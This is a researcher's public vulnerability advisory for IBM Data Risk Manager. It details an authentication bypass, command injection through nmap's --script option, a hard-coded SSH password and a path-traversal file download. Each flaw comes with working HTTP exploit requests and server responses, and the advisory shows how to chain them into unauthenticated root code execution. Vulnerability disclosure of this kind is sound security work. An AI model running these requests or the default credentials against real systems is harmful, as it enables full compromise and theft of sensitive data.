# Multiple Vulnerabilities in IBM Data Risk Manager

### By Pedro Ribeiro (pedrib@gmail.com | [@pedrib1337](https://twitter.com/pedrib1337)) from [Agile Information Security](https://agileinfosec.co.uk)

#### Disclosure Date: 2020-04-21 | Last Updated: 2020-06-12

* [Summary](#summary)
    * [Update (2020-06-12)](#update)
    * [Here's a bunch of 0 days!](#0days)
    * [So many questions...](#questions)
* [Vulnerability Details](#vulnerability-details)
    * [#1: Authentication Bypass](#1-authentication-bypass)
    * [#2: Command Injection](#2-command-injection)
    * [#3: Insecure Default Password](#insecure-default-password)
    * [#4: Arbitrary File Download](#4-arbitrary-file-download)
* [Fixes / Mitigations](#fixes--mitigations)


## Product Information
[From the vendor's website](https://www.ibm.com/products/data-risk-manager):  
*What you don’t know can hurt you. Identify and help prevent risks to sensitive business data that may impact business processes, operations, and competitive position. IBM Data Risk Manager provides executives and their teams a business-consumable data risk control center that helps to uncover, analyze, and visualize data-related business risks so they can take action to protect their business.*

## Summary
**tl;dr scroll to the bottom to see videos of the exploits in action**

IBM Data Risk Manager (IDRM) is an enterprise security software by IBM that aggregates and provides a full view of all the enterprise security risks, akin to an electronic risk register.  
The product receives information feeds from vulnerability scanning tools and other risk management tools, aggregates them and allows a user to investigate them and perform comprehensive analysis.

The IDRM Linux virtual appliance was analysed and it was found to contain four vulnerabilities, three critical risk and one high risk:  

* Authentication Bypass  
* Command Injection
* Insecure Default Password
* Arbitrary File Download 
  
This advisory describes the four vulnerabilities and the steps necessary to chain the first three to achieve unauthenticated remote code execution as root. In addition, two Metasploit modules that bypass authentication and exploit the [remote code execution](https://github.com/rapid7/metasploit-framework/pull/13300) and [arbitrary file download](https://github.com/rapid7/metasploit-framework/pull/13301) are being released to the public.

At the time of disclosure, it is unclear if the latest version 2.0.6 is affected by these, but most likely it is, as there is no mention of fixed vulnerabilities in any changelog, and it was released before the *attempt* to report these vulnerabilities to IBM. The latest version Agile InfoSec has access to is 2.0.3, and that one is certainly vulnerable. The status of version 2.0.0 is unknown, but that version is out-of-support anyway. 

### <a id="update"></a>Update (2020-06-12)
Looks like IBM finally confirmed that [the vulnerabilities exist](https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/), and according to [their security bulletin](https://www.ibm.com/support/pages/node/6206875), IDRM is vulnerable to:

* Authentication Bypass on versions 2.0.6.1 and earlier
* Command Injection on versions 2.0.4 and earlier
* Insecure Default Password on versions 2.0.6.1 and earlier
* Arbitrary File Download / Path Traversal on versions 2.0.4 and earlier

All vulnerabilities should be fixed in version 2.0.6.2 or higher. Note that I did not confirm this, I'm taking IBM's claims at face value here, and these claims should be taken with HUGE grain of salt. In the security bulletin IBM says:
> The Authentication Bypass issue only exists if SAML authentication is enabled. (...) SAML authentication is not enabled by default.

Which is total bull\*\*\*\*, the vulnerabilities in this advisory were found in their IDRM virtual appliance - not a demo, but the **production virtual appliance** customers are supposed to deploy in their environments.

They were also *kind enough* to create CVE entries for these issues, which have been updated in this advisory below.

Finally, the Metasploit modules were accepted into the framework, and now there are 3 of them:

* [IBM Data Risk Manager Unauthenticated Remote Code Execution](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/ibm_drm_rce.rb)
* [IBM Data Risk Manager a3user Default Password](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/ssh/ibm_drm_a3user.rb)
* [IBM Data Risk Manager Arbitrary File Download](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/http/ibm_drm_download.rb)

The rest of the original advisory follows.
  
### <a id="0days"></a>Here's a bunch of 0 days!

At the time of disclosure these vulnerabilities are **"0 days"**. An attempt was made to contact [CERT/CC](https://www.kb.cert.org/vuls/) to coordinate disclosure with IBM, but IBM **REFUSED** to accept the vulnerability report, and responded to CERT/CC with:  

***we have assessed this report and closed as being out of scope for our vulnerability disclosure program since this product is only for "enhanced" support paid for by our customers**. This is outlined in our policy https://hackerone.com/ibm. To be eligible to participate in this program, you must not be under contract to perform security testing for IBM Corporation, or an IBM subsidiary, or IBM client within 6 months prior to submitting a report.*

This is an unbelievable response by IBM, a multi billion dollar company that is **selling security enterprise products and security consultancy** to huge corporations worldwide. They refused to accept a free high quality vulnerability report on one of their products, while putting ludicrous quotes like the following [on their website](https://www.ibm.com/security):

*When every second counts, you need a unified defense to identify, orchestrate and automate your response to threats. IBM Security Threat Management solutions help you thrive in the face of cyber uncertainty.*

*Building a custom security plan that is both industry-specific and aligned to your security maturity demands a partner with deep expertise and global reach. The IBM Security Strategy and Risk services team is that valued partner.*

It should be noted that IBM offers no bounties on their "bug bounty program", just kudos:

![Kudos](./kudos.jpeg)

In any case, I did not ask or expect a bounty since I do not have a HackerOne account and I don't agree with HackerOne's or IBM's disclosure terms there. 
I simply wanted to disclose these to IBM responsibly and let them fix it.

### <a id="questions"></a>So many questions...
IDRM is an enterprise security product that handles very sensitive information. The hacking of an IDRM appliance might lead to a full scale company compromise, as it stores credentials to access other security tools, not to mention it contains information about critical vulnerabilities that affect the company.

* Why did IBM refuse to accept a **FREE** detailed vulnerability report?
* What does their answer mean? Are they only accepting vulnerability reports from customers?
* Or is the product out of support? If so, why is still being offered for sale to new customers?
* How can they be so irreponsible while selling an enterprise security product?

Anyway, with this out of the way let's get technical...

## Vulnerability Details

### #1: Authentication Bypass
* [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
* [CVE-2020-4427](https://nvd.nist.gov/vuln/detail/CVE-2020-4427)
* Risk Classification: Critical
* Attack Vector: Remote
* Constraints: None / N/A
* Affected Products / Versions:
  * IBM Data Risk Manager 2.0.1 to 2.0.6.1

#### Details:
IDRM has an API endpoint at */albatross/saml/idpSelection* that associates an ID provided by the attacker with a valid user on the system. The method that handles this endpoint is shown below:

```java
	@RequestMapping(value={"/saml/idpSelection"}, method={RequestMethod.GET})
	public String idpSelection(HttpServletRequest httpRequest, HttpServletResponse httpResponse, Model model, @RequestParam(value="id", required=false) String sessionId, @RequestParam(value="userName", required=false) String userName, RedirectAttributes rattrs) {
		List allUrls = this.a3repository.getA3AllUrlsRepository().findByTypeAndIsDeletedAndGuardiumType(A3Constants.A3_URL_TYPE.MICROSERVICES.getValue(), A3Constants.INT_ZERO, A3Constants.A3_MICROSERVICE_TYPE.IDENTITY_MANAGER.getValue());
		if (allUrls == null || allUrls.size() == 0) {
			rattrs.addAttribute("message", (Object)"Microservice instance is not running or more than one instance is running, please start the microservice and try again");
			return "redirect:/error";
		}
		if (allUrls.size() == 1) {
			A3AllUrls aUrl = (A3AllUrls)allUrls.get(0);
			String url = aUrl.getUrl();
			if (userName == null || userName.equals("")) {
				rattrs.addAttribute("message", (Object)"Enter the user name, please try again");
				return "redirect:/error";
			}
			if (sessionId == null || sessionId.equals("")) {
				rattrs.addAttribute("message", (Object)"Session ID is not present, please try again");
				return "redirect:/error";
			}
			A3User user = this.a3repository.getA3userService().findA3UserByUserNameIgnoreCaseAndIsDeleted(userName, A3Constants.INT_ZERO);
			if (user == null) {
				rattrs.addAttribute("message", (Object)("User " + userName + " account not present in IDRM, please create the account and try again"));
				return "redirect:/error";
			}
			user.setSessionId(sessionId);
			user.setLastUpdate(null);
			this.a3repository.getA3userService().save((Object)user);
			String page = null;
			page = url.endsWith("/") ? "redirect:" + url + "saml/idpSelection" : "redirect:" + url + "/saml/idpSelection";
			return page;
		}
		return "redirect:/error";
	}

```

As it can be seen in the code above, this method accepts an arbitrary *sessionId* and *username* parameters from the HTTP request, and if *username* exists on the application's user database, it then associates that *sessionId* to the *username*.  
This can be achieved by an unauthenticated attacker with the following request:
```
GET /albatross/saml/idpSelection?id=SOMETHING&userName=admin
```

The server will respond with a 302 redirect to https://localhost:8765/saml/idpSelection, but that doesn't really matter. This action might not make sense now, but read on.

The API endpoint */albatross/user/login* is handled by the following method (only the relevant snippets are shown):
```java
   @RequestMapping(value={"/user/login"}, method={RequestMethod.POST}, consumes={"multipart/form-data"})
    public A3StatusBean userLogin(HttpServletRequest httpRequest, @RequestParam(value="username", required=true) String username, @RequestParam(value="deviceid") String deviceId, @RequestParam(value="password", required=false) String password, @RequestParam(value="sessionId", required=false) String sessionId, @RequestParam(value="clientDetails", required=true) String clientDetails) {
        (...)
                A3User user = this.a3repository.getA3userService().findA3UserByUserNameIgnoreCase(username);
                if (user != null) {
                    if (sessionId != null) {
                        if (sessionId.equals(user.getSessionId())) {
        (...)
                            LOGGER.log(A3Constants.A3LOG, "Session is matching, so user is valid");
                            response.setRequestedUrl(A3Utils.getWebURLWithQueryString((HttpServletRequest)httpRequest));
                            response.setHttpStatus(Integer.toString(HttpStatus.OK.value()));
                            response.setServerCode(Integer.toString(A3FullStackResponseConstants.SUCCESS));
                            if (this.userMap.get(user.getUserId()) == null) {
                                user.setSessionId(null);
                                String randomPwd = UUID.randomUUID().toString();
                                user.setPassword(A3BcryptUtil.getBCryptHash(randomPwd));
                                this.a3repository.getA3userService().save((Object)user);
                                this.userMap.put(user.getUserId(), randomPwd);
                                response.setData((Object)randomPwd);
                            } else {
                                String tPassword = this.userMap.get(user.getUserId());
                                user.setPassword(A3BcryptUtil.getBCryptHash(tPassword));
                                this.a3repository.getA3userService().save((Object)user);
                                response.setData((Object)tPassword);
                            }
                            return response;
                        }
        (...)
    }
```

The method listed above takes the *username* and *sessionId* parameters, and checks if *username* exists in the database and *sessionId* is associated with that *username*. If it is, the application returns a newly generated random password for that username.  
In the previous request, the "*admin"* user was associated with the *sessionId "SOMETHING"*. So now if we perform the following request:
```
POST /albatross/user/login HTTP/1.1
Host: 10.0.10.25:8443
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: multipart/form-data; boundary=_Part_224_2171658712_4042463386
Content-Length: 509
Connection: close

--_Part_224_2171658712_4042463386
Content-Disposition: form-data; name="deviceid"


--_Part_224_2171658712_4042463386
Content-Disposition: form-data; name="password"

< ... any string can be sent here ... >
--_Part_224_2171658712_4042463386
Content-Disposition: form-data; name="username"

admin
--_Part_224_2171658712_4042463386
Content-Disposition: form-data; name="clientDetails"


--_Part_224_2171658712_4042463386
Content-Disposition: form-data; name="sessionId"

SOMETHING
--_Part_224_2171658712_4042463386--

```

The server will respond with:
```
{"httpStatus":"200","serverCode":"2001","requestedUrl":"https://10.0.10.25:8443/albatross/user/login","data":"b6e1a82b-3f33-4297-86e1-ca780d16cb02"}
```

... which is now a valid password for the *"admin"* user, as the previous snippet of code shows.

So now let's try and authenticate using that as a password:
```
POST /albatross/user/login HTTP/1.1
Host: 10.0.10.25:8443
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: multipart/form-data; boundary=_Part_122_4062871012_3985537084
Content-Length: 435
Connection: close

--_Part_122_4062871012_3985537084
Content-Disposition: form-data; name="deviceid"


--_Part_122_4062871012_3985537084
Content-Disposition: form-data; name="password"

b6e1a82b-3f33-4297-86e1-ca780d16cb02
--_Part_122_4062871012_3985537084
Content-Disposition: form-data; name="username"

admin
--_Part_122_4062871012_3985537084
Content-Disposition: form-data; name="clientDetails"


--_Part_122_4062871012_3985537084--
```

To which the server responds with:
```
{"httpStatus":"200","serverCode":"2001","requestedUrl":"https://10.0.10.25:8443/albatross/user/login","data":{"access_token":"3b5b0fa6-2d46-4104-ba38-54a077d05a93","token_type":"bearer","expires_in":28799,"scope":"read write"}}
```

Success! We now have a valid Bearer administrative token that can be used to access various API. It's also possible to login as a normal web user on the */albatross/login* endpoint, which will yield an authenticated cookie instead of a token, allowing access to the web administration console. In any case, as this shows, authentication is now completely bypassed and we have full administrative access to IDRM.

It should be noted that this is a destructive action - the previous admin password will be invalid, and only the new password which is generated above can be used to login as an admin. So this works a bit like a *"password reset"*, even though it is not named as such.


### #2: Command Injection
* [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)
* [CVE-2020-4428](https://nvd.nist.gov/vuln/detail/CVE-2020-4428)
* Risk Classification: Critical
* Attack Vector: Remote
* Constraints: Authentication Required
* Affected Products / Versions:
  * IBM Data Risk Manager 2.0.1 to 2.0.4

#### Details:
IDRM exposes an API at */albatross/restAPI/v2/nmap/run/scan* that allows an authenticated user to perform nmap scans. The call stack and relevant code is pasted below:

```java
	@RequestMapping(value={"/run/nmap/scan"}, method={RequestMethod.POST})
	public A3StatusBean runNmapScan(HttpServletRequest httpRequest, @RequestParam(value="transaction", required=false) String transactionData, @RequestParam(value="accessToken") String accessToken, @RequestParam(value="userId", required=false) String userName) {
          
          (...)
          runNmapScan invokes A3CustomScriptScanTask.run() 

                A3CustomScriptScanTask.run() invokes A3IpScannerUtils.runNmapOnIpAddress()
                        
                        public static A3ExtAppNmapHostDTO runNmapOnIpAddress(String nmapPath, String nmapOptions, String ipAddress, String portRange) throws IOException, InterruptedException {
                                String[] nmapOpts;
                                A3ExtAppNmapHostDTO nmapHost = null;
                                LOGGER.log(A3EurekaConstants.OPERATIONAL, "Running nmap Scan");
                                ArrayList<String> command = new ArrayList<String>();
                                command.add(nmapPath);
                                for (String nmapOpt : nmapOpts = nmapOptions.split(" ")) {
                                        command.add(nmapOpt);
                                }
                                command.add(ipAddress);
                                Process process = null;
                                if (portRange != null && !portRange.equals("")) {
                                        command.add("-p");
                                        command.add(portRange);
                                        process = Runtime.getRuntime().exec(command.toArray(new String[command.size()]));
                                } else {
                                        process = Runtime.getRuntime().exec(command.toArray(new String[command.size()]));
                                
                                (...)
                        }
          (...)
        }
```          

The full call chain is not displayed above for brevity, but nmap gets invoked with an *ipAddress* provided by the attacker in a *multipart/form-data* POST request to the */albatross/restAPI/v2/nmap/run/scan* API endpoint. 
We can inject anything we want in this parameter but, as seen above, this gets put into a String array that is passed to *Runtime.getRuntime().exec()*. As this function works in a similar way to C's *execve()*, it is not possible to perform command injection in a parameter. 

As listed in [GTFObins](https://gtfobins.github.io/gtfobins/nmap), having access to nmap allows running arbitrary commands if we can upload a script file and then pass that as an argument to nmap with *"--script=<FILE\>"*. Since we cannot inject commands in a parameter, our best chance is to write the commands to a file and pass that in the *--script* argument to nmap.

However, to achieve code execution in this way we still need to be able to upload a file. Luckily, there is a method that processes patch files and accepts arbitrary file data, saving it to *"/home/a3user/agile3/patches/<FILE\>"*. The method is too long and verbose to paste here, but it is supposed to accept a patch file, process it and apply it.
There are several bugs in version 2.0.2 that cause the method to abort early and fail to process the file. Still, the file is uploaded and kept on disk even after the method aborts. In other versions, there is some processing done, but again the file is kept on disk after the method terminates.

In order to upload a file, we simply need to send the following request:
```
POST /albatross/upload/patch HTTP/1.1
Host: 10.0.10.25:8443
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Cookie: JSESSIONID=D68124D3EFD66417B4C6B0950E1891C0;
CSRF-TOKEN: 4f88a837-5f12-4d15-a0d5-57b24de17176
Content-Type: multipart/form-data; boundary=_Part_387_3982485447_258275719
Content-Length: 330
Connection: close

--_Part_387_3982485447_258275719
Content-Disposition: form-data; name="patchFiles"; filename="owned.enc"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

os.execute("/usr/bin/whoami > /tmp/testing")
--_Part_387_3982485447_258275719--
```
The server will respond with a 200 OK but will include a JSON message saying an error has occured. This is irrelevant, as the file was still uploaded to disk.  
Finally we inject our parameters and run nmap with the following request:
```
POST /albatross/restAPI/v2/nmap/run/scan/18 HTTP/1.1
Host: 10.0.10.25:8443
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Authorization: Bearer 3b5b0fa6-2d46-4104-ba38-54a077d05a93
Content-Type: multipart/form-data; boundary=_Part_841_3176682485_2250831758
Content-Length: 440
Connection: close

--_Part_841_3176682485_2250831758
Content-Disposition: form-data; name="clientDetails"


--_Part_841_3176682485_2250831758
Content-Disposition: form-data; name="type"

1
--_Part_841_3176682485_2250831758
Content-Disposition: form-data; name="portRange"


--_Part_841_3176682485_2250831758
Content-Disposition: form-data; name="ipAddress"

--script=/home/a3user/agile3/patches/owned.enc
--_Part_841_3176682485_2250831758--
```
This will execute *"nmap --script=/home/a3user/agile3/patches/owned.enc"* and run our command:
```
[a3user@idrm-server ~]$ cat /home/a3user/agile3/patches/owned.enc
os.execute("/usr/bin/whoami > /tmp/testing")
[a3user@idrm-server ~]$ cat /tmp/testing
a3user
```
Note that all of these requests require an authenticated session as an administrator - but as shown in #1, this can be easily bypassed. The actual flow to achieve full unauthenticated remote code execution is a bit more convoluted, as we need to authenticate to both the web interface and the API, but the basic workings have been described above.


### #3: Insecure Default Password
* [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
* [CVE-2020-4429](https://nvd.nist.gov/vuln/detail/CVE-2020-4429)
* Risk Classification: Critical
* Attack Vector: Remote
* Constraints: None / N/A
* Affected Products / Versions:
  * IBM Data Risk Manager 2.0.1 to 2.0.6.1

#### Details:
The administrative user in the IDRM virtual appliance is *"a3user"*. This user is allowed to login via SSH and run sudo commands, and it is set up with a default password of *"idrm"*.  

When combined with vulnerabilities #1 and #2, this allows an unauthenticated attacker to achieve remote code execution as root on the IDRM virtual appliance, leading to complete system compromise.  

While IDRM forces the administrative user of the web interface (*"admin"*) to change its password upon first login, it does not require the same of *"a3user"*. 

### #4: Arbitrary File Download
* [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
* [CVE-2020-4430](https://nvd.nist.gov/vuln/detail/CVE-2020-4430)
* Risk Classification: High
* Attack Vector: Remote
* Constraints: Authentication Required
* Affected Products / Versions:
  * IBM Data Risk Manager 2.0.2 to 2.0.4

#### Details:

IDRM exposes an API at */albatross/eurekaservice/fetchLogFiles* that allows an authenticated user to download log files from the system. However, the *logFileNameList* parameter contains a basic directory traversal flaw that allows an attacker to download any file off the system.  
The code path is convoluted, and won't be shown here for brevity, but exploitation (and finding this flaw) is very simple:

```
POST /albatross/eurekaservice/fetchLogFiles HTTP/1.1
Host: 10.0.10.25:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.0.10.25:8443/albatross/home
Content-Type: application/json
CSRF-TOKEN: 93e0dbe1-88e5-450e-ab2c-7c614b709876
Content-Length: 93
Cookie: JSESSIONID=ABFFB7EB959FAC45743AC2889960DFD0
Connection: close

{"instanceId":"local_host","logLevel":"DEBUG","logFileNameList":"../../../../../etc/passwd,"}
```

Response:
```
HTTP/1.1 200 
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Disposition: attachment; filename=ms_logs_admin.zip
Accept-Ranges: bytes
X-Content-Type-Options: nosniff
Content-Type: application/zip
Content-Length: 550
Date: Wed, 17 Oct 2018 11:46:45 GMT
Connection: close

<ZIP file containing /etc/passwd>
```
When combined with #1, this allows an unauthenticted attacker to download any file readable by *"a3user"* off the system.
It should be noted that version 2.0.1 is not vulnerable, but versions higher than 2.0.1 are. Attempting to download an arbitrary file using this method will result in a HTTP 500 error with a *"File security exception"* message.

## Exploitation Summary
By combining vulnerabilities #1, #2 and #3, an unauthenticated user can achieve remote code execution as root. [A Metasploit module implementing this RCE chain was released](https://github.com/rapid7/metasploit-framework/pull/13300) and the asciinema clip below shows it in action:  
[![asciicast](https://asciinema.org/a/328326.svg)](https://asciinema.org/a/328326)

If vulnerabilities #1 and #4 are combined, it's possible for an unauthenticated attacker to download arbitrary files off the system. [A second Metasploit module implementing this file download chain was released](https://github.com/rapid7/metasploit-framework/pull/13301), and the asciinema clip below shows it in action:  
[![asciicast](https://asciinema.org/a/328317.svg)](https://asciinema.org/a/328317)


## Fixes / Mitigations:
IBM refused to acknowledge this vulnerability report, so most likely won't fix these vulnerabilities. Make sure you uninstall the product so it does not endanger your network / company.

## Disclaimer
Please note that Agile Information Security Limited (Agile InfoSec) relies on information provided by the vendor / product manufacturer when listing fixed versions, products or releases. Agile InfoSec does not verify this information, except when specifically mentioned in the advisory text and requested or contracted by the vendor to do so.
Unconfirmed vendor fixes might be ineffective, incomplete or easy to bypass and it is the vendor's responsibility to ensure all the vulnerabilities found by Agile InfoSec are resolved properly. Agile InfoSec usually provides the information in its advisories free of charge to the vendor, as well as a minimum of six months for the vendor to resolve the vulnerabilities identified in its advisories before they are made public.
Agile InfoSec does not accept any responsibility, financial or otherwise, from any material losses, loss of life or reputational loss as a result of misuse of the information or code contained or mentioned in its advisories. It is the vendor's responsibility to ensure their products' security before, during and after release to market.

## License
All information, code and binary data in this advisory is released to the public under the [GNU General Public License, version 3 (GPLv3)](https://www.gnu.org/licenses/gpl-3.0.en.html). For information, code or binary data obtained from other sources that has a license which is incompatible with GPLv3, the original license prevails.


